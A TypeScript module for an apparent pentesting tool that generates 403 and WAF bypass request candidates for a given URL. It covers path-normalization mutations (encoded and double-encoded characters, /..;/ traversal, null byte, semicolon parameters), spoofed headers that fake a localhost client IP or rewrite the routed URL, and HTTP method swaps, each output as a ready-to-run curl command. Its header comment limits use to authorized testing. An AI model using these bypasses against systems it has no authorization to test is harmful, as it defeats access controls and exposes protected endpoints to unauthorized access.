/**
 * 403 / WAF bypass candidate generator.
 *
 * A forbidden URL is rarely forbidden every way you can ask for it. This builds the
 * mutations that access-control and WAF misconfigurations are known to miss — path
 * rewriting, header-driven auth spoofing, method changes — as ready-to-send requests.
 *
 * For AUTHORIZED testing only. It sends nothing itself: each candidate is a request you
 * run from the Repeater or the copied curl, and a bypass is only real when the server
 * returns something the original 403 withheld. Discovering an origin behind a CDN, or
 * anything that defeats a control you are not permitted to test, is out of scope for
 * this tool by design.
 */

export interface BypassCandidate {
  group: "path" | "header" | "method";
  technique: string;
  method: string;
  url: string;
  headers: [string, string][];
  note: string;
  curl: string;
}

function shellQuote(s: string): string {
  return `'${s.replace(/'/g, "'\\''")}'`;
}

function curlFor(method: string, url: string, headers: [string, string][]): string {
  const parts = [`curl -i -s -o /dev/null -w '%{http_code}' -X ${method} ${shellQuote(url)}`];
  for (const [n, v] of headers) parts.push(`  -H ${shellQuote(`${n}: ${v}`)}`);
  return parts.join(" \\\n");
}

/** Rebuild a URL with a replaced pathname, leaving origin and query intact. */
function withPath(base: URL, path: string): string {
  const u = new URL(base.toString());
  u.pathname = path;
  return u.toString();
}

export function generateBypasses(rawUrl: string, method = "GET"): BypassCandidate[] {
  let base: URL;
  try {
    base = new URL(rawUrl.trim());
  } catch {
    throw new Error("Enter a full URL, e.g. https://host/admin");
  }

  const path = base.pathname === "" ? "/" : base.pathname;
  const seg = path.replace(/\/+$/, ""); // path without trailing slash
  const origin = `${base.protocol}//${base.host}`;
  const out: BypassCandidate[] = [];

  const pushPath = (technique: string, newPath: string, note: string) => {
    const url = withPath(base, newPath);
    out.push({ group: "path", technique, method, url, headers: [], note, curl: curlFor(method, url, []) });
  };
  const pushHeader = (technique: string, headers: [string, string][], note: string) => {
    out.push({ group: "header", technique, method, url: base.toString(), headers, note, curl: curlFor(method, base.toString(), headers) });
  };
  const pushMethod = (m: string, note: string) => {
    out.push({ group: "method", technique: `method ${m}`, method: m, url: base.toString(), headers: [], note, curl: curlFor(m, base.toString(), []) });
  };

  // ---- path mutations ----
  pushPath("trailing slash", `${seg}/`, "A router that matched the exact path may not match with a trailing slash.");
  pushPath("double leading slash", `/${seg}`.replace(/^\/+/, "//"), "Some front-ends collapse // differently from the origin.");
  pushPath("trailing dot-slash", `${seg}/.`, "Normalization mismatch between proxy and origin.");
  pushPath("dot-segment prefix", `/./${seg.replace(/^\//, "")}`, "A /./ that the proxy keeps but the origin strips.");
  pushPath("semicolon suffix", `${seg};`, "Matrix parameter the ACL may not account for.");
  pushPath("semicolon path param", `${seg};foo=bar`, "Path parameter smuggled past a prefix match.");
  pushPath("encoded slash suffix", `${seg}%2f`, "Encoded slash the WAF may decode after the ACL check.");
  pushPath("encoded first char", `/${encodeFirst(seg.replace(/^\//, ""))}`, "First path character percent-encoded.");
  pushPath("double-encoded first char", `/${doubleEncodeFirst(seg.replace(/^\//, ""))}`, "Double URL-encoding to survive one decode pass.");
  pushPath("uppercase path", seg.toUpperCase(), "Case-sensitive ACL over a case-insensitive filesystem/route.");
  pushPath("trailing whitespace (%20)", `${seg}%20`, "Trailing space the origin trims.");
  pushPath("trailing tab (%09)", `${seg}%09`, "Trailing tab the origin trims.");
  pushPath("trailing %00", `${seg}%00`, "Null byte truncation on legacy stacks.");
  pushPath("suffix .json", `${seg}.json`, "Extension the ACL did not list.");
  pushPath("path traversal escape", `/..;/${seg.replace(/^\//, "")}`, "Tomcat-style /..;/ that some proxies mis-normalize.");

  // ---- header-driven auth / WAF bypass ----
  pushHeader("X-Original-URL", [["X-Original-URL", seg]], "Ask '/' but route to the target via a header some stacks honour.");
  pushHeader("X-Rewrite-URL", [["X-Rewrite-URL", seg]], "Same idea, different header name.");
  pushHeader("X-Forwarded-For localhost", [["X-Forwarded-For", "127.0.0.1"]], "Trick an IP-allowlist that trusts XFF.");
  pushHeader("X-Real-IP localhost", [["X-Real-IP", "127.0.0.1"]], "Alternative client-IP header.");
  pushHeader("X-Originating-IP localhost", [["X-Originating-IP", "127.0.0.1"]], "Older allowlist header.");
  pushHeader("X-Client-IP localhost", [["X-Client-IP", "127.0.0.1"]], "Another client-IP variant.");
  pushHeader("X-Forwarded-Host", [["X-Forwarded-Host", "localhost"]], "Spoof the host a control keys on.");
  pushHeader("X-Custom-IP-Authorization", [["X-Custom-IP-Authorization", "127.0.0.1"]], "Seen guarding internal admin routes.");
  pushHeader("Referer same-origin", [["Referer", origin + seg]], "Referer-based gate that trusts its own origin.");
  pushHeader("X-Forwarded-Scheme https", [["X-Forwarded-Scheme", "https"], ["X-Forwarded-Proto", "https"]], "Scheme-based redirect/deny logic.");

  // ---- method changes ----
  for (const m of ["POST", "HEAD", "OPTIONS", "PUT", "TRACE"]) {
    if (m !== method) pushMethod(m, "A control scoped to one verb may miss another.");
  }

  return out;
}

function encodeFirst(s: string): string {
  if (s === "") return s;
  return "%" + s.charCodeAt(0).toString(16).padStart(2, "0") + s.slice(1);
}

function doubleEncodeFirst(s: string): string {
  if (s === "") return s;
  return "%25" + s.charCodeAt(0).toString(16).padStart(2, "0") + s.slice(1);
}
